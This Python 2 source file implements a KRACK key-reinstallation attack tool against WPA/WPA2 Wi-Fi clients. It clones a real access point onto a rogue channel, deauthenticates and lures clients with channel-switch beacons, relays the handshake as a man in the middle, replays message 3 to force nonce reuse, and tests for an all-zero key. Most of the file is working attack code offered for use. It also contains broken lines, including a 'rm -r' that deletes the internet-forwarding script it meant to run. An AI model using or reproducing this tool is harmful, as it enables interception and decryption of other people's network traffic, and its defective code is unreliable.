 #!/usr/bin/env python2

# Copyright (c) 2017, Adam Casey-Rerhaye
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.
"""
Usage:
	krack-zero-key.py -k <rouge_interface> <interface> <ssid> [--target <target_client>] [-v | --vv]
	krack-zero-key.py -s <rouge_interface> <interface> [<ssid>] [-v]
	krack-zero-key.py -r <rouge_interface> <interface>
	krack-zero-key.py -h | --help
	krack-zero-key.py --disable-hw

Options:
	-k...................Preform a key-reinstalltion attack
	-v...................Verbose output (Show's the pink debug messages) - optional.
	--vv.................Even more verbose output, WARNING! there's alot of output!
	-r...................To reset/restart services and close the rouge AP.
	-h, --help...........Displays this message.
	interface............The interface used.
	rouge_interface......The interface used on the rouge channel.
	ssid.................The SSID of the network to be cloned (spaces should be replace by '/').
	--target.............Target client to exploit. This script will work better with a specific target - optional.
	--disable-hw.........Disables hardware encryption.
	

	Make sure to have all the dipendacies installed (see README for details)
	To compile hostapd, open a terminal in the hostapd dir:
		
   		cp defconfig .config
   		make -j 2
	
	May need to disable harware encryption
	used --disable-hw to do so, then reboot to take effect
	
	If error: Too many files open in system occours, run with -r option to reset
	the interface configuration.
"""
import sys, time, os, subprocess, shlex, socket, struct, string, heapq, textwrap, fileinput
from docopt import docopt
from wpaspy import *
from libclass import *
from scapy.all import *

IEEE_TLV_TYPE_SSID   		= 0
IEEE_TLV_TYPE_CHANNEL		= 3
IEEE_TLV_TYPE_RSN     		= 48
IEEE_TLV_TYPE_CSA     		= 37
IEEE_TLV_TYPE_VENDOR  		= 221

HANDSHAKE_TRANSMIT_INTERVAL = 2

IEEE80211_RADIOTAP_RATE 			= (1 << 2)
IEEE80211_RADIOTAP_CHANNEL			= (1 << 3)
IEEE80211_RADIOTAP_TX_FLAGS 		= (1 << 15)
IEEE80211_RADIOTAP_DATA_RETRIES 	= (1 << 17)


#Master functions:
def set_mac_address(iface, macaddr):
		subprocess.check_output(["ifconfig", iface, "down"])
		try:
			subprocess.check_output(["macchanger", "-m", macaddr, iface])
		except subprocess.CalledProcessError, ex:
			if not "It's the same MAC!!" in ex.output:
				raise
		subprocess.check_output(["ifconfig", iface, "up"])
def hostapd_command(hostapd_ctrl, cmd):
	pass
def disable_hwcrypto():
	log(INFO, 'Disabling hardware encryption')
	subprocess.check_output(['./disable-hwcrypto.sh'])

#Class to configure the hostapd network to clone the real AP
#Credit to Mathy Vanhoef for providing what info is needed
class Network_Config:
	def __init__(self):
		self.ssid = None
		self.real_channel = None
		self.rouge_channel = None
		self.group_cipher = None
		self.wpavers = 0
		self.pairwise_ciphers = set()
		self.akms = set()
		self.wmmenabled = 0
		self.capab = 0
	
	#check if the target network is actually a WPA1/2 RSN
	def check_wparsn(self):
		return not self.group_cipher is None and self.wpavers > 0 and \
		len(self.pairwise_ciphers) > 0 and len(self.akms) > 0
		
	def parse_wpa_rsn(self, wparsn):
		self.group_cipher = ord(wparsn[5])

		num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
		pos = wparsn[8:]
		for i in range(num_pairwise):
			self.pairwise_ciphers.add(ord(pos[3]))
			pos = pos[4:]

		num_akm = struct.unpack("<H", pos[:2])[0]
		pos = pos[2:]
		for i in range(num_akm):
			self.akms.add(ord(pos[3]))
			pos = pos[4:]

		if len(pos) >= 2:
			self.capab = struct.unpack("<H", pos[:2])[0]
	
	#extract the useful info from the beacon probe
	def get_beacon_info(self, p):
		el = p[Dot11Elt]
		while isinstance(el, Dot11Elt):
			if el.ID == IEEE_TLV_TYPE_SSID:
				self.ssid = el.info
			elif el.ID == IEEE_TLV_TYPE_CHANNEL:
				self.real_channel = ord(el.info[0])
			elif el.ID == IEEE_TLV_TYPE_RSN:
				self.parse_wpa_rsn(el.info)
				self.wpavers |= 2
			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x01":
				self.parse_wpa_rsn(el.info[4:])
				self.wpavers |= 1
			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x02":
				self.wmmenabled = 1
			el = el.payload
	
	def get_rouge_channel(self):
		return self.rouge_channel
	
	#writes the config file for hostapd to use	
	def write_config(self, iface):
		self.rouge_channel = 1 if self.real_channel >= 6 else 11
		log(DEBUG, 'Rouge channel is: %s'%str(self.rouge_channel))
		CONFIG = """
ctrl_interface=hostapd_ctrl
ctrl_interface_group=0

interface={iface}
ssid={ssid}
channel={channel}

wpa={wpaver}
wpa_key_mgmt={akms}
wpa_pairwise={pairwise}
rsn_pairwise={pairwise}
rsn_ptksa_counters={ptksa_counters}
rsn_gtksa_counters={gtksa_counters}

wmm_enabled={wmmenabled}
wmm_advertised={wmmadvertised}
hw_mode=g
auth_algs=3
wpa_passphrase=XXXXXXXX"""
		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
		ciphers2str = {2: "TKIP", 4: "CCMP"}
		return CONFIG.format(
			iface = iface,
			ssid = self.ssid,
			channel = self.rouge_channel,
			wpaver = self.wpavers,
			akms = " ".join([akm2str[idx] for idx in self.akms]),
			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
			ptksa_counters = (self.capab & 0b001100) >> 2,
			gtksa_counters = (self.capab & 0b110000) >> 4,
			wmmadvertised = 1, #int(args.group), #no group args would be 0
			wmmenabled = self.wmmenabled)


#This class reprisents a client object that we can man-in-the-middle 
#and use to use and store data as the connected client
class Client:
	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)
	def __init__(self, macaddr, utils):
		self.macaddr = macaddr
		self.utils  = utils
		self.reset()
	
	def reset(self):
		self.state = Client.Initializing
		self.keystreams = dict()
		self.attack_max_iv = None
		self.attack_time = None
		
		self.assocreq = None
		self.msg1 = None
		self.msg2 = None
		self.msg3s = []
		self.msg4 = None
		self.krack_finished = False
	
	def set_msg1(self, msg1):
		self.msg1 = msg1
	
	def write_state(self, state):
		if state == 0: return 'Initializing'
		if state == 1: return 'Connecting'
		if state == 2: return 'GotMitm'
		if state == 3: return 'Attack_Started'
		if state == 4: return 'Success_Reinstalled'
		if state == 5: return 'Success_AllzeroKey'
		if state == 6: return 'Failed'
		
	
	def get_replay_num(self, p):
		return struct.unpack('>Q', str(p[EAPOL])[9:17])[0]
	
	def set_state(self, state):
		return self.state == state
	
	def add_new_msg3(self, msg3):
	#simply add's any new msg3's to the list
		if self.get_replay_num(msg3) in [self.get_replay_num(p) for p in self.msg3s]:
			return
		self.msg3s.append(msg3)
	
	def update_clientstate(self, state):
		log(DEBUG, 'Client (%s) state has moved to %s'%(self.macaddr, self.write_state(self.state)))
		self.state = state
	
	def mark_got_mitm(self):
		if self.state == Client.Connecting or self.state == Client.Initializing:
			self.state = Client.GotMitm
			log(STATUS, 'Man-in-the-Middle posistion established against client (%s). Moved to stage %s'%(self.macaddr, self.write_state(self.state)))

	
	def should_forward(self, p):
		if self.state in [Client.Connecting, Client.GotMitm, Client.Attack_Started]:
			return Dot11Auth in p or Dot11AssoReq in p or Dot11AssoResp in p or\
			(1 <= get_eapol_msg_num(p) and get_eapol_msg_num(p) <= 3)\
			or (p.type == 0 and p.subtype == 13)
		return self.state in [Client.Success_Reinstalled]
		
	def save_iv_keystream(self, iv, keystream):
		self.keystreams[iv] = keystream
		
	def get_keystream(self, iv):
		return self.keystreams[iv]
	
	def is_iv_reused(self, iv):
		return self.set_state(Client.Attack_Started) and iv in self.keystreams
	
	def attack_start(self):
		#gets the latest IV
		self.attack_max_iv = 0 if len(self.keystreams.keys()) == 0 else max(self.keystreams.keys())
		#log the start of the attack time
		self.attack_time = time.time()
		#update the state
		self.update_clientstate(Client.Attack_Started)
		
	def attack_timeout(self, iv):
		return self.set_state(Client.Attack_Started) and self.attack_time + 1.5 < time.time() and self.attack_max_iv < iv


class KrackAttack:
	def __init__(self, rouge_interface, interface, target_client, ssid, log, big_verbose, sniffer):

		#these 3 varibles contain system arg's pasred from command line
		#they specify which function(s) to run
		self.big_verbose = big_verbose
		self.rouge_iface = rouge_interface
		self.iface = interface
		self.iface_mon = None
		self.rouge_iface_mon = None
		self.rouge_mac = None
		self.iface_client_ack = None
		self.sniff = sniffer
		#if there is a target client then this just cleans up the mac addr if needed
		self.t_clientmac = None if target_client is None else target_client
		self.ssid = ssid
		self.Clients = dict()
		self.ap_mac_addr = None
		self.ivs = IvCollection()
		self.rouge_channel = None
		self.clientMac = None
		self.dhcp = None
		self.rouge_sock = None
		self.f_sock = None
		self.hostapd = None
		self.hostapd_ctrl = None
		self.ip_forward = None
		self.group_ip = None
		self.group_arp = None
		self.TK = None
		self.beacon = None
		self.real_ap_mac = None
		self.utils = None
		self.disas_queue = []
		self.null_frames = []
	
	def config_internet(self, iface, eth_iface='eth0'):
		log(INFO, 'Forwarding internet through %s'%eth_iface)
		subprocess.call(['rm', '-r', './enable_internet_forwarding.sh', eth_iface, iface])
	
	def finish_attack(self, client):
		if client.assocreq is None:
			log(WARNING, '''No association request was capture from client (%s), cannot pass client to rouge hostapd to handle'''%client.macaddr)
			return
		
		#adding the client to hostapd
		log(INFO, 'Registering client with rouge hostapd')
		p = Dot11(addr1=self.real_ap_mac, addr2=client.macaddr, addr3=self.real_ap_mac)/Dot11Auth(seqnum=1)
		self.hostapd_ctrl.request("RX_MGMT "+ str(p[Dot11]).encode('hex'))
		#send the encryption algorithm too
		self.hostapd_ctrl.request("RX_MGMT "+str(client.assocreq[Dot11]).encode('hex'))
		#tell hostapd that the handshake is finished
		self.hostapd_ctrl.request("FINISH_4WAY %s"%client.macaddr)
	
	def handle_from_pairwise(self, client, p):
		#this sequence is to strip the frame check sequence as scapy can't handle it 
		#(only 4 bytes to skip)
		plaintext = "\xaa\xaa\x03\x00\x00\x00"
		encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
		keystream = self.utils.xorstr(plaintext, encrypted)
		
		iv = dot11_get_iv(p)
		#check fo IV and then keystream reuse
		if client.is_iv_reused(iv):
			#if the keystream from the client object is the same as the keystream from the frame recived then
			#we have a normal key reinsalltion
			if keystream == client.get_keystream(iv):
				log(STATUS, '''KEYSTREAM And NONCE reused detected! (IV=%s)'''%iv)
				client.update_clientstate(Client.Success_Reinstalled)
				#to finish the handshake adn give the client an IP
				if client.msg4 is not None:
					self.f_sock.send(client.msg4)
					self.utils.print_packet(STATUS, 'Rouge Channel', client.msg4, suffix='-- Finishing Auth')
					log(STATUS, ''''Sending EAPOL msg4 to finish the "authentication"''')
			#If the keystream isn't the same then the client has installed a new key 
			#(hopefully an all zero key)
			else:
				log(STATUS, '''NONCE reuse detected! Testing for an all-zero key (IV=%s)'''%iv)
				#attemps to decrypt the frame and check if the first 6 bytes are as expected if an 
				#all zero key is used
				if decrypt_ccmp(p, '\x00'*16).startswith('\xAA\xAA\x03\x00\x00\x00'):
					log(STATUS, 'SUCCSESS! All-Zero key is being used! packets can now be decrypted!')
					client.update_clientstate(Client.Success_AllzeroKey)
				else:
				#otherwise it's an normal key reinstalltion 
					client.update_clientstate(Client.Success_Reinstalled)
				self.finish_attack(client)
		#if clients are completly patched, or the attack is taking too long then we'll mark 
		#the client as failed
		elif client.attack_timeout(iv):
			log(ERROR, 'Attack agaisnt client (%s) failed.'%client.macaddr)
			client.update_clientstate(Client.Failed)
		#saves the keystream so we can compare it next frame
		client.save_iv_keystream(iv, keystream)
		
	def handle_to_pairwise(self, client,  p):
		eapol_num = get_eapol_msg_num(p)
		#Saves msg1 for later use
		if eapol_num == 1 and client.state in [Client.Connecting, Client.GotMitm]:
			log(DEBUG, 'Got Msg1!')
			client.set_msg1(p)
			
		elif eapol_num == 3 and client.state in [Client.Connecting, Client.GotMitm]:
			client.add_new_msg3(p)
			#We need to send at least 2 msg3's to the client, once we do, we can forward them
			if len(client.msg3s) >= 2:
				log(STATUS, '''Got at least 2 EAPOL message 3's!''')
				log(STATUS, '''Preforming a Key Re-installation attack against client: %s'''%client.macaddr)
				#sending the stored msg 3's
				packet_list = client.msg3s
				p = self.utils.set_replay_num(client.msg1, get_replay_num(packet_list[0]) + 1)
				packet_list.insert(1, p)
				
				for p in packet_list:
					self.rouge_sock.send(p)
				#resetting the msg3's list and marking the client as attack start
				client.msg3s = []				
				client.attack_start()
			else:
				log(STATUS, '''Not got enought EAPOL MSG3's to forward on yet (%s have been queued)'''%len(client.msg3s))
			
			return True
		return False
		
	def handle_rouge_iface(self):
		p = self.rouge_sock.recv()
		if p == None: return
		# 1. Handle frames sent BY the rouge AP
		if p.addr2 == self.real_ap_mac:
			#Display all frames sent to the targeted client
			if self.t_clientmac is not None and p.addr1 == self.t_clientmac:
				self.utils.print_packet(INFO, "Rogue channel", p)
			
			#And display all frames sent to a MitM'ed client
			elif p.addr1 in self.Clients:
				self.utils.print_packet(INFO, "Rogue channel ", p)

		# 2. Handle frames sent TO the AP
		elif p.addr1 == self.real_ap_mac:
			client = None

			#Check if it's a new client that we can MitM
			if Dot11Auth in p:
				self.utils.print_packet(INFO, "Rogue channel", p, color='green')
				self.Clients[p.addr2] = Client(p.addr2, self.utils)
				self.Clients[p.addr2].mark_got_mitm()
				client = self.Clients[p.addr2]
				will_forward = True
				log(DEBUG, 'Client set-up complete')
			#Otherwise check of it's an existing client
			elif p.addr2 in self.Clients:
				client = self.Clients[p.addr2]
				if self.sniff != True	: 
					will_forward = client.should_forward(p) 
				else: True
				self.utils.print_packet(INFO, "Rogue channel", p)
			#Always display all frames sent by the targeted client
			elif p.addr2 == self.t_clientmac:
				self.utils.print_packet(INFO, "Rogue channel", p, suffix='--Target')
			
			#If this now belongs to a client we want to krack, this will process the packet further
			if client is None: log(DEBUG, 'Client is None object')
			if client is not None:
				#Save association request for config info
				if Dot11AssoReq in p: client.assocreq = p
				# Save msg4 so we can complete the handshake after the attack has been carried out
				if get_eapol_msg_num(p) == 4: client.msg4 = p

				#got this far means the client is definatly connectyed to the rouge AP
				client.mark_got_mitm()

				if Dot11WEP in p:
					self.handle_from_pairwise(client, p)

				if will_forward:
					# Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
					if client.state < Client.Attack_Started:
						p.FCfield &= 0xFFEF

					self.f_sock.send(p)
				#handling DHCP with scapy if the attack has been succsesfull
				#if client.state == [Client.Success_Reinstalled, Client.Success_AllzeroKey, Client.Failed]:
				if p.haslayer(DHCP):
					self.dhcp.reply(p)
					self.group_arp.reply(p)

		# 3. Always display all frames sent by or to the targeted client
		elif p.addr1 == self.t_clientmac or p.addr2 == self.t_clientmac:
			self.utils.print_packet(INFO, "Rogue channel", p)
			
		
	def handle_iface(self):
		p = self.f_sock.recv()
		if p is None: return

		#1. Handle frames sent TO the real AP
		if p.addr1 == self.real_ap_mac:
			#If it's an authentication to the real AP we want to switch the client over to our AP
			if Dot11Auth in p:
				#shows the auth packet
				self.utils.print_packet(INFO, "Real channel ", p, color="orange")
				if self.t_clientmac == p.addr2:
					log(WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.t_clientmac)
				#it'll be a new client so we want to delete any previous config and start clean
				if p.addr2 in self.Clients: del self.Clients[p.addr2]
				
				#Sending two CSA's to switch target to our rouge channel
				self.utils.send_csa_beacon(self.rouge_channel, self.beacon, self.f_sock, target=p.addr2)
				self.utils.send_csa_beacon(self.rouge_channel, self.beacon, self.f_sock)
				#adding client to Clients
				self.Clients[p.addr2] = Client(p.addr2, self.utils)
				self.Clients[p.addr2].update_clientstate(Client.Connecting)

			#Remember association request to save connection info
			elif Dot11AssoReq in p:
				if p.addr2 in self.Clients: self.Clients[p.addr2].assocreq = p
				self.utils.print_packet(INFO, 'Real Channel', p, suffix='--saved')

			#Clients sending a deauthentication or disassociation to the real AP
			elif Dot11Deauth in p or Dot11Disas in p:
				self.utils.print_packet(INFO, "Real channel ", p)
				if p.addr2 in self.Clients: del self.Clients[p.addr2]
			

			#For all other frames, only display them if they come from the targeted client
			elif self.t_clientmac is not None and self.t_clientmac == p.addr2:
				self.utils.print_packet(INFO, "Real channel ", p)


			#Prevent the AP from thinking clients that are connecting are sleeping
			if p.FCfield & 0x10 != 0 and p.addr2 in self.Clients and self.Clients[p.addr2].state <= Client.Attack_Started:
				log(WARNING, "Injecting Null frame so AP thinks client %s is awake" % p.addr2)
				null = Dot11(type=2, subtype=4, addr1=self.real_ap_mac, addr2=p.addr2, addr3=self.real_ap_mac)
				self.f_sock.send(null)
				self.null_frames.append(null)
				#if the client connects to real channel during attack rouge ap will spam null frames
				#this fixes the spamming and sends CSA's to try to switch client back to rouge channel
				if len in self.null_frames <=10:
					self.utils.send_csa_beacon(self.rouge_channel, self.beacon, self.f_sock, target=p.addr2)
					self.utils.send_csa_beacon(self.rouge_channel, self.beacon, self.f_sock)
					self.null_frames = []
				


		#2. Handle frames sent BY the real AP
		elif p.addr2 == self.real_ap_mac:

			#decide weather it'll be forwarded
			might_forward = p.addr1 in self.Clients and self.Clients[p.addr1].should_forward(p)

			#Deauth and Disas frames are interesting
			if Dot11Deauth in p or Dot11Disas in p:
				self.utils.print_packet(INFO, "Real channel ", p)
			#If targeting a specific client, display all frames it sends
			elif self.t_clientmac is not None and self.t_clientmac == p.addr1:
				self.utils.print_packet(INFO, "Real channel ", p)
			#For other clients, just display what might be forwarded
			elif might_forward:
				self.utils.print_packet(INFO, "Real channel ", p)

			#This is where the frames get forwarded on or not
			if might_forward:
				if p.addr1 in self.Clients:
					client = self.Clients[p.addr1]
					#Handles the key reinstalltion for frames going TO the client
					if self.handle_to_pairwise(client, p):
						pass
					elif Dot11Deauth in p:
						del self.Clients[p.addr1]
						self.rouge_sock.send(p)
					else:
						self.rouge_sock.send(p)
				else:
					self.rouge_sock.send(p)

		# 3. Always display all frames sent by or to the targeted client
		elif p.addr1 == self.t_clientmac or p.addr2 == self.t_clientmac:
			self.utils.print_packet(INFO, "Real channel ", p)
				
	def run(self):
		self.netconfig = Network_Config()
		self.config_interface()
		
		#creating the sockets to run hostapd and capture packets
		self.rouge_sock = MitmSocket(type=ETH_P_ALL, iface=self.rouge_iface_mon, verb=self.big_verbose)
		self.f_sock 	= MitmSocket(type=ETH_P_ALL, iface=self.iface, verb=big_verbose)
		#initing the Utils class from libclass, this will have utility methodsto use
		self.utils = Utils(self.iface, self.rouge_iface, self.ssid, log)
		
		#getting the beacon frame form the real AP
		self.beacon, self.real_ap_mac = self.utils.find_beacon(self.rouge_sock)
		if self.beacon and self.real_ap_mac is 'ex':
			self.restart()
		log(DEBUG, 'self.real_ap_mac is: %s'%self.real_ap_mac)

		#extracting the info we need from the beacon
		self.netconfig.get_beacon_info(self.beacon)
		
		#checking compatibility
		if self.sniff == False:
			if not self.netconfig.check_wparsn():
				log(ERROR, '''%s isn't a WPA1/2 secured network, Exiting....'''%self.ssid)
				self.restart()
			elif self.netconfig.real_channel > 13:
				log(WARNING, '''%s is opertating on 5GHz. The attack isn't tested on this frequency, but we'll try anyway'''%self.ssid)
			
		#if the target AP is compatible this writes the config file for hostapd to clone the AP
		with open("hostapd_rogue.conf", "w") as fp:
			fp.write(self.netconfig.write_config(self.rouge_iface))
		#setting the mac addr of the rouge interface, and the ack interface if there's a target	
		self.utils.set_mac_address(self.rouge_iface, self.real_ap_mac)
		if self.iface_client_ack: subprocess.check_output(["ifconfig", self.iface_client_ack, "up"])
		
		#BPF filter will increase preformace. latancy isn't something that you want on a rouge AP
		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.real_ap_mac)
		if self.t_clientmac:
			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.t_clientmac)
		bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
		self.rouge_sock.attach_filter(bpf)
		self.f_sock.attach_filter(bpf)
		
		self.rouge_channel = self.netconfig.get_rouge_channel()
		
		#starting hostapd deamon
		try:	
			self.hostapd = subprocess.Popen(['../hostapd/hostapd', './hostapd_rogue.conf'])
			#give time for hostapd to startup so we can attach to it
			time.sleep(2)
		except OSError:
			log(ERROR, '''ERROR: Could not find the hostapd client, check hostapd's directory, did you compile?''')
			raise
		except Exception as e:
			log(ERROR, '''ERROR: Couldn't open hostapd, did you disable wifi in networking/compile the hostapd deamon?\nEXCEPTION: %s'''%e)
			raise
		time.sleep(1)
		#connecting to the hostapd control interface
		try:
			path = ('hostapd_ctrl/'+self.rouge_iface)
			self.hostapd_ctrl = Ctrl(path)
			self.hostapd_ctrl.attach()
		except Exception as e:
			log(ERROR, 'FATAL ERROR: Could not attach to hostapd control intnterface\nEXCEPTION: %s'%e)
			self.restart()
			raise
		#DHCP can be handled with scapy
		self.dhcp = DHCP_sock(sock=self.rouge_sock, 
			domain='testing.com', 
			pool=Net('192.168.100.0/24'), 
			network='192.168.100.0/24', 
			gw='192.168.100.254', 
			renewal_time=600, 
			lease_time=3600)
				
		#setting the interface to the right IP
		subprocess.check_output(["ifconfig", self.rouge_iface, "192.168.100.254"])
		#some more IP config
		self.group_ip = self.dhcp.pool.pop()
		self.group_arp = ARP_sock(sock=self.rouge_sock, IP_addr=self.group_ip, ARP_addr=self.real_ap_mac)
		
		#configuring internet forwarding
		self.config_internet(self.rouge_iface)
		
		#Sending Channel Switch Alert to any clients
		self.utils.send_csa_beacon(self.netconfig.rouge_channel, self.beacon, self.f_sock, 5)
		#Deauth all clients so they connect to the rouge AP
		log(INFO, 'Deauthing connected clients')
		self.utils.client_deauth(self.f_sock, 2, silent=True)
		
		if self.t_clientmac:
			self.queue_disas(self.t_clientmac)
		
		log(STATUS, 'Waiting on stations to connect')
		#The main event loop, this will monitor both interfaces for incomming frames, and send any queued
		#disas frames to clients
		while True:
			#monitoring both interfaces
			sel = select.select([self.rouge_sock, self.f_sock], [], [], 0.1)
			if self.rouge_sock in sel[0]:
				self.handle_rouge_iface()
			if self.f_sock in sel[0]:
				self.handle_iface()
				
			#sending any queued dissas frames
			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
				self.send_disas(self.disas_queue.pop()[1])	
			
	#queue's Dissasociations to be sent in a timely mannor in the event loop
	def queue_disas(self, macaddr):
		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
		heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))
	#send's dissasociation frames to clients
	def send_disas(self, macaddr, hush=False):
		p = Dot11(addr1=macaddr, addr2=self.real_ap_mac, addr3=self.real_ap_mac)/Dot11Disas(reason=0)
		self.f_sock.send(p)
		if not hush:
			log(INFO, 'Rouge Channel > Injected Dissasociation frame to %s'%macaddr)
	
	def config_interface(self):
		#Just to be sure..
		subprocess.check_output(["rfkill", "unblock", "all"])
		
		if self.rouge_iface_mon is None:
			subprocess.call(["iw", self.rouge_iface + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
		#setting the interface to monitor mode
		subprocess.check_output(["ifconfig", self.iface, "down"])
		subprocess.check_output(["iw", self.iface, 'set', 'type', 'monitor'])
		subprocess.check_output(["ifconfig", self.iface, "up"])
		#creating the rouge interface's virtul monitor mode
		if self.rouge_iface_mon is None:
			self.rouge_iface_mon = self.rouge_iface + 'mon'
			subprocess.check_output(["iw", self.rouge_iface, 'interface', 'add', self.rouge_iface_mon, 'type', 'monitor'])
			subprocess.check_output(["ifconfig", self.rouge_iface_mon, 'up'])
			
		#some linux distro's don't configure the virtual monitor interface properly, the next few lines are
		#to make sure it does.
		time.sleep(2)
		subprocess.check_output(['ifconfig', self.rouge_iface_mon, 'down'])
		subprocess.check_output(['iw', self.rouge_iface_mon, 'set', 'type', 'monitor'])
		subprocess.check_output(['ifconfig', self.rouge_iface_mon, 'up'])
		
		#this sets an interface to act like the client so to acknowlage frames.
		if self.t_clientmac:
			log(DEBUG, self.t_clientmac)
			self.iface_client_ack = self.iface + 'sta1'
			subprocess.check_output(["iw", self.iface, "interface", "add", self.iface_client_ack, "type", "managed"])
			set_mac_address(self.iface_client_ack, self.t_clientmac)
		else:
			log(WARNING, '''Targeting all clients isn't reccomended. Add a target with --target''')
			time.sleep(1)
			
			
		#shows the final config of the interface for debbuing 
		string = 'interface is: {interface}, rouge interface is: {rouge_interface}, rouge monitor interface is: {rouge_mon_interface}, normal monitor interface is: {mon_interface}, SSID is: {ssid}'.format(interface=self.iface, rouge_interface=self.rouge_iface, rouge_mon_interface=self.rouge_iface_mon, mon_interface=self.iface, ssid=self.ssid)
		log(DEBUG, string)
	
	def restart(self):
		#restarts services, and ensures everything goes back to defaults
		log(INFO, 'Cancelling...')
		subprocess.call(['killall', 'hostapd'])
		time.sleep(0.5)
		log(INFO, 'Restarting services...')
		try:
			subprocess.check_output(['iw', self.rouge_iface+'mon', 'del'])
			subprocess.check_output(['ifconfig', self.rouge_iface, 'down'])
			subprocess.check_output(['iw', self.iface+'sta1', 'del'])
		except:
			log(WARNING, 'No interface to delete')
		
		subprocess.Popen(['service', 'NetworkManager', 'start'])
		subprocess.Popen(['service', 'network-manager', 'start'])
		subprocess.Popen(['service', 'wpa_supplicant', 'start'])
		time.sleep(1.5)
		log(STATUS, 'Exiting...')
		sys.exit(1)
	


if __name__ == "__main__":
	#passing the comand line args from hostapd to their
	#respective variables
	args 			= docopt(__doc__, version='v0.9')
	rouge_interface	= args["<rouge_interface>"]
	interface	 	= args["<interface>"]
	ssid			= args["<ssid>"]
	target_client	= args['<target_client>']
	is_target		= args['--target']
	execute			= args['-k']
	Restart			= args['-r']
	sniffer			= args['-s']
	verbose			= args['-v']
	big_verbose		= args['--vv']
	disable_hw		= args['--disable-hw']
	
	#configures verbose logging
	if big_verbose:
		verbose = True
	log = Logging(verbose)
	#cleaning the SSID
	if ssid is not None: ssid.replace( '/', ' ').lower()
	#checkign if user is root
	if os.geteuid(): 
		log(ERROR, 'ERROR: Must be root, exiting...') 
		sys.exit(0)
		
	#This is the main class
	krack = KrackAttack(rouge_interface, interface, target_client, ssid, log, big_verbose, sniffer)
	
	if execute or sniffer:
		log(STATUS, 'Killing any process that might get in the way...')
		#Prints out an error if aircrack-ng isn't installed
		try:
			subprocess.check_output(['airmon-ng', 'check', 'kill'])
		except Exception as e:
			log(WARNING, '''Could not check for processes that might interfere, install aircrack-ng and don't blame me if it crashes''')
				
		subprocess.call(['killall', 'hostapd'])
		try:
			krack.run()
		except KeyboardInterrupt:
			krack.restart()
	if disable_hw: 
		disable_hwcrypto()	
	if Restart: 
		krack.restart()
	
	
	
